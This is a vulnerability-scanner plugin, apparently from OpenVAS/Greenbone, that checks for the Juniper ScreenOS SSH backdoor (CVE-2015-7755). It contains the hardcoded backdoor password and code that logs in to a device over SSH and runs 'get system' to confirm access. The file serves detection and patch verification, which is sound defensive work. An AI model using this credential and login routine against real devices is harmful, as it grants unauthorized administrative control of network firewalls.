# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105495");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2015-7755", "CVE-2015-7754");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2026-04-24T06:23:04+0000");

  script_name("Backdoor in ScreenOS (SSH)");

  script_xref(name:"URL", value:"http://kb.juniper.net/index?page=content&id=JSA10713&actp=RSS");
  script_xref(name:"URL", value:"http://kb.juniper.net/index?page=content&id=JSA10712&actp=RSS");

  script_tag(name:"vuldetect", value:"Try to login with backdoor credentials.");

  script_tag(name:"insight", value:"It was possible to login using any username and the password: <<< %s(un='%s') = %u

  In February 2018 it was discovered that this vulnerability is being exploited by the 'DoubleDoor' Internet of Things
  (IoT) Botnet.");

  script_tag(name:"solution", value:"This issue was fixed in ScreenOS 6.2.0r19, 6.3.0r21, and all subsequent releases.");

  script_tag(name:"summary", value:"ScreenOS is vulnerable to an unauthorized remote administrative access to the device over SSH or telnet.");

  script_tag(name:"affected", value:"These issues can affect any product or platform running ScreenOS 6.2.0r15 through 6.2.0r18 and 6.3.0r12 through 6.3.0r20.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"2026-04-24 06:23:04 +0000 (Fri, 24 Apr 2026)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2026-04-21 16:27:21 +0000 (Tue, 21 Apr 2026)");
  script_tag(name:"creation_date", value:"2015-12-21 10:33:33 +0100 (Mon, 21 Dec 2015)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("ssh_detect.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  exit(0);
}

if( get_kb_item( "default_credentials/disable_default_account_checks" ) )
  exit( 0 );

include("ssh_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ssh_get_port( default:22 );

if( ssh_dont_try_login( port:port ) )
  exit( 0 );

# nb: No need to continue/start if we haven't received any banner...
if( ! ssh_get_serverbanner( port:port ) )
  exit( 0 );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

# it seems that ANY username is accepted using the BD password
user = "netscreen";
pass = "<<< %s(un='%s') = %u";

login = ssh_login( socket:soc, login:user, password:pass, priv:NULL, passphrase:NULL );
if( login == 0 ) {

  cmd = "get system";
  res = ssh_cmd( socket:soc, cmd:cmd, nosh:TRUE, pty:TRUE, pattern:"Software Version: " );
  close( soc );

  if( "Product Name:" >< res && "FPGA checksum" >< res && "Compiled by build_master at" >< res ) {
    report = 'It was possible to login as user "' + user + '" with password "' + pass + '" and to execute the "' + cmd + '" command. Result:\n\n' + res;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

if( soc ) close( soc );
exit( 99 );
